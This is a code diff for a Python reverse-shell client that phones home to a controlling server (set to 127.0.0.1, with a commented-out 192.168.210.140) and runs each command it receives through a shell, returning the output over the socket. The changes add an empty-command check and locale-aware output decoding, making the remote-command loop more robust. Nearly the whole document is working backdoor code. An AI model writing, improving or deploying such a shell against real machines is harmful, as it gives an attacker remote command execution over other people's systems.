@@ -2,7 +2,7 @@
 import socket
 import subprocess
 import os
-from time import sleep
+import sys,locale
 server = "127.0.0.1"#"192.168.210.140"
 BUFFER = 1024*128
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -34,27 +34,32 @@ def rce():
             print("network error")
             connected = False
             break
-
-        if command == "pwd":
-            output = os.getcwd()
-        elif command == "exit":
-            connected = False
-            break
-        elif splited_command[0] == "cd":
-            try:
-                os.chdir(os.getcwd().join(splited_command[1:]))
+        if len(splited_command) > 0:
+            if command == "pwd":
                 output = os.getcwd()
-            except FileNotFoundError as e:
-                output = str(e)
+            elif command == "exit":
+                connected = False
+                break
+            elif splited_command[0] == "cd":
+                try:
+                    os.chdir(os.getcwd().join(splited_command[1:]))
+                    output = os.getcwd()
+                except FileNotFoundError as e:
+                    output = str(e)
+                    
+            else:
+                p = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                out, err = p.communicate()
+                p.stdin.close()
+                output = out.decode(encoding=locale.getpreferredencoding(), errors="ignore").strip('\n') if out else err.decode(encoding=locale.getpreferredencoding(), errors="ignore").strip('\n')
                 
-        else:
-            output = subprocess.getoutput(command)
-        print("output:\n",output)
-        output +='\0'
-        s.send(output.encode())
+            print("output:\n",output)
+            output +='\0'
+            s.send(output.encode())
 
     
 while True:
     phoneHome()
     rce()
     
+
